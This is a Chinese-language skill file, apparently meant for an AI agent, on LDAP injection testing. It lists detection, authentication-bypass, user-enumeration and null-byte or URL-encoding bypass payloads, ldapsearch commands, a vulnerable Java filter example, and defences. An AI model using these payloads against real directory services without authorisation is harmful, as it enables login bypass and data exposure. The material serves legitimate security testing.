---
name: ldap-injection-testing
description: LDAP注入漏洞测试的专业技能和方法论
version: 1.0.0
---

# LDAP注入漏洞测试

## 概述

LDAP注入是一种类似于SQL注入的漏洞，利用LDAP查询语句的构造缺陷，可能导致信息泄露、权限绕过等。

## 漏洞原理

**危险代码示例：**
```java
String filter = "(&(cn=" + userInput + ")(userPassword=" + password + "))";
ldapContext.search(baseDN, filter, ...);
```

## LDAP基础

### 查询语法
```
(cn=John)
(objectClass=person)
(&(cn=John)(mail=john@example.com))
(|(cn=John)(cn=Jane))
(!(cn=John))
```

### 特殊字符
需要转义：`(`, `)`, `*`, `\`, `/`, NUL

## 测试方法

### 1. 识别LDAP输入点
- 用户登录、用户搜索、目录浏览、权限验证

### 2. 基础检测
```
*)
(&
*)(|
*))
*))%00
```

### 3. 认证绕过
**基础绕过：**
```
用户名: *)(&
密码: *
查询: (&(cn=*)(&)(userPassword=*))
```

**更精确的绕过：**
```
用户名: admin)(&
密码: *
```

### 4. 信息泄露
**枚举用户：**
```
*)(cn=*
*)(uid=*
*)(mail=*
```

## 绕过技术

### 编码绕过
**URL编码：**
```
*)(& → %2A%29%28%26
```

### 空字符注入
```
*))%00
```

## 工具使用

### ldapsearch
```bash
# 基础查询
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)"

# 测试注入
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)(&"
```

## 防护措施

1. **输入验证** - 转义特殊字符
   ```java
   private static final String[] LDAP_ESCAPE_CHARS = {"\\", "*", "(", ")", "\0", "/"};
   ```
2. **参数化查询** - 使用LDAP API的参数化功能
3. **白名单验证** - 只允许特定字符
4. **最小权限** - LDAP连接使用最小权限账户
5. **错误处理** - 不返回详细错误信息
